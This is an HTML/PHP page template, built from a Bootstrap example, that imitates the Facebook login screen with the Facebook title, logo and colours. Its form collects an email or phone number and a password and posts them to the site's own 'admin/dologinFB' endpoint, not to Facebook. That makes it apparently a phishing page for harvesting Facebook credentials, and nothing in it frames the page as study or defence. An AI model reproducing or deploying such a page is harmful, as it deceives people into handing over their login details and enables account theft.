<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="generator" content="Jekyll v3.8.5">
    <title>Log in to Facebook| Facebook</title>

     <link rel="icon" href="<?=base_url()?>assets/images/face.png" type="image/png" sizes="16x16">

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css" integrity="sha384-GJzZqFGwb1QTTN6wy59ffF1BuGJpLSa9DkKMp0DgiMDm4iYMj70gZWKYbI706tWS" crossorigin="anonymous">
    <link rel="canonical" href="https://getbootstrap.com/docs/4.2/examples/pricing/">

    <!-- Bootstrap core CSS -->
<link href="/docs/4.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GJzZqFGwb1QTTN6wy59ffF1BuGJpLSa9DkKMp0DgiMDm4iYMj70gZWKYbI706tWS" crossorigin="anonymous">


    <style>
      .bd-placeholder-img {
        font-size: 1.125rem;
        text-anchor: middle;
      }

      @media (min-width: 768px) {
        .bd-placeholder-img-lg {
          font-size: 3.5rem;
        }
      }
    </style>
    <!-- Custom styles for this template -->
    <link href="pricing.css" rel="stylesheet">
  </head>
  <body style="background-color: #e9ebee" >
<div style="background-color: #4867aa;" class="d-flex flex-column flex-md-row align-items-center p-3 px-md-4 mb-3 border-bottom shadow-sm">
  <h5 style="color: white;" class="my-0 mr-md-auto font-weight-normal"><img style="height: 50px;" src="<?=base_url()?>assets/images/facebook.png"></h5>
  <a class="btn btn-success" href="#">Create New Account</a>
</div>

<div class="pricing-header px-3 py-3 pt-md-5 pb-md-4 mx-auto text-center">
  <h1 class="display-4"></h1>
  <p class="lead"></p>
</div>

<div style="background-color: #fff;text-align: center;height: 400px;" class="container">
  
</br>
</br>
</br>
<div class="_xku" id="header_block">
  <span style="font-size: 25px;" class="_50f6">Log in to Facebook</span>
</div>


<div class="login_form_container">
  <form class="cmxform form-horizontal " action="<?php echo base_url()?>admin/dologinFB" method="post" enctype="multipart/form-data">
      <div class="form-group">
          
      </div>
      <div class="form-group">
          <label class="col-lg-6 control-label" for="role Source"><input type="text" class=" form-control" name="email" placeholder="Email address or phone number" autofocus="1" required></label>
      </div>

      <div class="form-group">
          <label class="col-lg-6 control-label" for="role Source"><input type="password" class=" form-control" name="password" placeholder="Password" autofocus="1" required></label>
      </div>

      <div class="form-group">
          <label class="col-lg-6 control-label" for="role Source"><input style="width: 550px;background-color: #4867aa;" class="btn btn-primary" type="submit" name="submit" value="Log In"></label>
      </div>
      <div class="form-group">
          
      </div>
      <div class="form-group">
          
      </div>
      <div class="form-group">
          
      </div>
  </form>
</div>




  <!-- <footer class="pt-4 my-md-5 pt-md-5 border-top">
    <div class="row">
      <div class="col-12 col-md">
        <img class="mb-2" src="/docs/4.2/assets/brand/bootstrap-solid.svg" alt="" width="24" height="24">
        <small class="d-block mb-3 text-muted">&copy; 2017-2018</small>
      </div>
      <div class="col-6 col-md">
        <h5>Features</h5>
        <ul class="list-unstyled text-small">
          <li><a class="text-muted" href="#">Cool stuff</a></li>
          <li><a class="text-muted" href="#">Random feature</a></li>
          <li><a class="text-muted" href="#">Team feature</a></li>
          <li><a class="text-muted" href="#">Stuff for developers</a></li>
          <li><a class="text-muted" href="#">Another one</a></li>
          <li><a class="text-muted" href="#">Last time</a></li>
        </ul>
      </div>
      <div class="col-6 col-md">
        <h5>Resources</h5>
        <ul class="list-unstyled text-small">
          <li><a class="text-muted" href="#">Resource</a></li>
          <li><a class="text-muted" href="#">Resource name</a></li>
          <li><a class="text-muted" href="#">Another resource</a></li>
          <li><a class="text-muted" href="#">Final resource</a></li>
        </ul>
      </div>
      <div class="col-6 col-md">
        <h5>About</h5>
        <ul class="list-unstyled text-small">
          <li><a class="text-muted" href="#">Team</a></li>
          <li><a class="text-muted" href="#">Locations</a></li>
          <li><a class="text-muted" href="#">Privacy</a></li>
          <li><a class="text-muted" href="#">Terms</a></li>
        </ul>
      </div>
    </div>
  </footer> -->
</div>
</body>
</html>
